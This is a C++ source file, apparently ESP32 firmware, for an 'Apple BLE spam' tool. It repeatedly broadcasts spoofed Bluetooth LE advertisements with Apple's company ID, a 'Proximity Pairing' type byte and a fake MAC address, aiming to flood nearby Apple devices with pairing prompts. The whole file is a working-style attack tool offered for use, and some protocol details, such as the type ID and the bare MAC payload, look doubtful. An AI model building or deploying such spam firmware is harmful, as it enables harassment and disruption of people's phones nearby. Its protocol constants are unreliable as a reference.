// src/AppleBLESpam.cpp
#include "AppleBLESpam.h"
#include <vector>
#include <cstring>

// Apple Bluetooth SIG CID in little-endian
static constexpr uint8_t kAppleCID[]               = { 0x4C, 0x00 };
// “Proximity Pairing” TLV type ID
static constexpr uint8_t kTLVType_ProximityPairing = 0x02;

AppleBLESpam::AppleBLESpam(const uint8_t fakeMac[6], uint16_t intervalMs)
  : _pAdv(nullptr)
  , _intervalMs(intervalMs)
  , _taskHandle(nullptr)
{
  memcpy(_fakeMac, fakeMac, 6);
}

void AppleBLESpam::begin() {
  // Initialize NimBLE
  NimBLEDevice::init("ESP32-AppleSpam");
  _pAdv = NimBLEDevice::getAdvertising();

  // Ensure no scan-response packet is sent
  NimBLEAdvertisementData emptyScan;
  _pAdv->setScanResponseData(emptyScan);

  // Make it non-connectable and set the advertising interval
  _pAdv->setConnectableMode(false);
  _pAdv->setAdvertisingInterval(_intervalMs);
}

void AppleBLESpam::start() {
  if (!_taskHandle) {
    xTaskCreatePinnedToCore(
      spamTask,
      "bleSpam",
      4096,
      this,
      1,
      &_taskHandle,
      1
    );
  }
}

void AppleBLESpam::stop() {
  if (_taskHandle) {
    vTaskDelete(_taskHandle);
    _taskHandle = nullptr;
    _pAdv->stop();
  }
}

void AppleBLESpam::buildAndSend() {
  NimBLEAdvertisementData advData;
  advData.setFlags(0x06); // general discoverable, BR/EDR unsupported

  // Build Manufacturer Specific Data: [CID][TLV-Type][Length][MAC]
  std::string msd;
  msd.append(reinterpret_cast<const char*>(kAppleCID), sizeof(kAppleCID));
  msd.push_back(static_cast<char>(kTLVType_ProximityPairing));
  msd.push_back(static_cast<char>(6));            // payload length
  msd.append(reinterpret_cast<const char*>(_fakeMac), 6);

  advData.setManufacturerData(msd);
  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void AppleBLESpam::spamTask(void* param) {
  auto self = static_cast<AppleBLESpam*>(param);
  for (;;) {
    self->buildAndSend();
    vTaskDelay(pdMS_TO_TICKS(self->_intervalMs));
  }
}
